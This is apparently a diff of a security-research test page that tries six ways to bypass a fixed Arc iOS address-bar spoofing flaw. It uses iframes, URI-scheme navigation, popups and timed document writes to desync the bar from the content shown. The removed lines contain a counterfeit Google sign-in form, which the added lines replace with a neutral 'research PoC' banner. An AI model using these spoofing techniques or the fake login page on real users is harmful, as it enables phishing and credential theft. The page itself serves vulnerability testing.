@@ -15,29 +15,29 @@ button:active{opacity:.7}
 </head>
 <body>
 <h2>iframe + URI Scheme (CVE-2025-14812 variants)</h2>
-<p>CVE-2025-14812 was fixed in Arc iOS 1.45.2: iframe-triggered URI-scheme navigation caused wrong domain in address bar. These test bypass variants of that fix.</p>
+<p>CVE-2025-14812 was fixed in Arc iOS 1.45.2: iframe-triggered URI-scheme navigation caused the wrong domain in the address bar. These test bypass variants of that fix. Watch the address bar after each test &mdash; if it shows accounts.google.com while a neutral PoC page is displayed, the bar is desynced.</p>
 
-<button onclick="t1()">Click me — iframe → tel: + parent nav</button>
+<button onclick="t1()">Click me &mdash; iframe &rarr; tel: + parent nav</button>
 <div class="info">iframe navigates to tel: scheme while parent navigates to Google. Check bar.</div>
 
-<button onclick="t2()">Click me — iframe → sms: + parent write</button>
-<div class="info">iframe triggers sms: scheme, parent writes phishing during app-switch dialog.</div>
+<button onclick="t2()">Click me &mdash; iframe &rarr; sms: + parent write</button>
+<div class="info">iframe triggers sms: scheme, parent writes a PoC page during the app-switch dialog.</div>
 
-<button onclick="t3()">Click me — nested iframe → shortcuts://</button>
-<div class="info">Double-nested iframe triggers shortcuts:// while outer iframe has trusted src.</div>
+<button onclick="t3()">Click me &mdash; nested iframe &rarr; shortcuts://</button>
+<div class="info">Double-nested iframe triggers shortcuts:// while outer iframe has a trusted src.</div>
 
-<button onclick="t4()">Click me — sandbox iframe → scheme + escape</button>
-<div class="info">Sandboxed iframe with allow-top-navigation triggers scheme then navigates top.</div>
+<button onclick="t4()">Click me &mdash; sandbox iframe &rarr; scheme + escape</button>
+<div class="info">Sandboxed iframe with allow-top-navigation triggers a scheme then navigates top.</div>
 
-<button onclick="t5()">Click me — iframe srcdoc → window.open + scheme</button>
+<button onclick="t5()">Click me &mdash; iframe srcdoc &rarr; window.open + scheme</button>
 <div class="info">srcdoc iframe opens popup, triggers scheme, writes to popup during transition.</div>
 
-<button onclick="t6()">Click me — rapid iframe src toggle</button>
+<button onclick="t6()">Click me &mdash; rapid iframe src toggle</button>
 <div class="info">Rapidly toggle iframe src between trusted URL and about:blank. Check parent bar.</div>
 
 <script>
 var G='https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn';
-var PHISH='<div style="font-family:-apple-system,sans-serif;max-width:380px;margin:0 auto;padding:40px 24px;text-align:center;background:#fff"><div style="font-size:24px;margin-bottom:4px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><h1 style="font-size:22px;font-weight:400;color:#202124;margin:10px 0">Sign in</h1><input placeholder="Email or phone" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><input type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"></div>';
+var PHISH='<div style="font-family:-apple-system,sans-serif;max-width:380px;margin:0 auto;padding:40px 24px;text-align:center;background:#fff"><div style="display:inline-block;background:#fff3cd;border:1px solid #ffe08a;border-radius:6px;padding:6px 10px;font-size:12px;color:#7a5c00;margin-bottom:16px">Security research PoC</div><h1 style="font-size:20px;font-weight:600;color:#1d1d1f;margin:10px 0">Address bar desync test</h1><p style="color:#5f6368;font-size:14px">If the bar above shows a domain that is not this page, a spoof reproduced. An attacker would render a spoofed login here.</p></div>';
 
 function t1(){
   var f=document.createElement('iframe');
@@ -61,7 +61,7 @@ function t2(){
       var w=window.open('about:blank','_blank');
       if(w){
         w.document.open();
-        w.document.write('<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;background:#fff">'+PHISH+'</body></html>');
+        w.document.write('<!DOCTYPE html><html><head><title>Desync test (research)</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;background:#fff">'+PHISH+'</body></html>');
         w.document.close();
       }
     },300);
@@ -88,7 +88,7 @@ function t5(){
   var f=document.createElement('iframe');
   f.style.cssText='width:0;height:0;border:0;position:absolute';
   f.sandbox='allow-scripts allow-popups allow-popups-to-escape-sandbox';
-  f.srcdoc='<scr'+'ipt>var w=window.open("'+G+'","spf5");setTimeout(function(){try{location.href="shortcuts://x-callback-url/run-shortcut"}catch(e){}setTimeout(function(){var w2=window.open("","spf5");if(w2){try{w2.document.open();w2.document.write(\'<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title></head><body style="margin:0;background:#fff">'+PHISH.replace(/'/g,"\\'")+'</body></html>\');w2.document.close();w2.stop()}catch(e){}}},500)},100)<\/scr'+'ipt>';
+  f.srcdoc='<scr'+'ipt>var w=window.open("'+G+'","spf5");setTimeout(function(){try{location.href="shortcuts://x-callback-url/run-shortcut"}catch(e){}setTimeout(function(){var w2=window.open("","spf5");if(w2){try{w2.document.open();w2.document.write(\'<!DOCTYPE html><html><head><title>Desync test (research)</title></head><body style="margin:0;background:#fff">'+PHISH.replace(/'/g,"\\'")+'</body></html>\');w2.document.close();w2.stop()}catch(e){}}},500)},100)<\/scr'+'ipt>';
   document.body.appendChild(f);
 }
 
@@ -107,7 +107,7 @@ function t6(){
     f.src='about:blank';
     try{
       f.contentDocument.open();
-      f.contentDocument.write('<html><head><title>Sign in - Google Accounts</title></head><body style="margin:0;background:#fff">'+PHISH+'</body></html>');
+      f.contentDocument.write('<html><head><title>Desync test (research)</title></head><body style="margin:0;background:#fff">'+PHISH+'</body></html>');
       f.contentDocument.close();
     }catch(e){}
   },1500);
